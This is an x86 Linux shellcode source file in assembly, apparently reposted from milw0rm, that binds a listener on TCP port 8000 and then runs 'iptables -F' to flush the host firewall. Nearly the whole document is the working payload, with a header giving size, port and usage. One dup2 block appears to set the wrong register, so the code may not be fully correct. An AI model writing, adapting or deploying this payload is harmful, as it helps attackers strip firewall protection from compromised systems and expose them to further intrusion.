;
; Title	: Bindport TCP/8000 & execve iptables -F
; os	: Linux x86
; size	: 176 bytes
; IP	: localhost
; Port	: 8000
; Use	: nc localhost 8000
;
; Author	: Jonathan Salwan
; Mail		: submit AT shell-storm.org
; Web		: http://www.shell-storm.org
;
;
; More shellcodes in => http://www.shell-storm.org/shellcode/
;

section .text
global _start

_start:
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x1
push	byte	0x2

mov	eax, 	0x66
mov	ebx, 	0x1
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;

mov 	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	byte	0x0
push	word	0x401f
push	word	0x2
mov	ebx, 	esp

push 	byte	0x10
push	ebx
push	edx

mov	eax, 	0x66
mov	ebx, 	0x2
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;
push	byte	0x1
push	edx

mov	eax,	0x66
mov	ebx,	0x4
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	edx

mov	eax, 	0x66
mov	ebx, 	0x5
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;

mov	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;
mov	eax, 	0x3f
mov	ebx, 	edx
mov 	ebx, 	0x2
int	0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x1
int     0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x0
int     0x80
;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;


;; execve(/sbin/iptables", "-F", NULL)
;; By Kris Katterjohn

push 	byte 	11
pop 	eax
cdq
push 	edx
push 	word 	0x462d
mov 	ecx, 	esp
push 	edx
push 	word 	0x7365
push 	0x6c626174
push 	0x70692f6e
push 	0x6962732f
mov 	ebx, 	esp
push 	edx
push 	ecx
push 	ebx
mov 	ecx, 	esp
int 	0x80

; milw0rm.com [2009-06-08]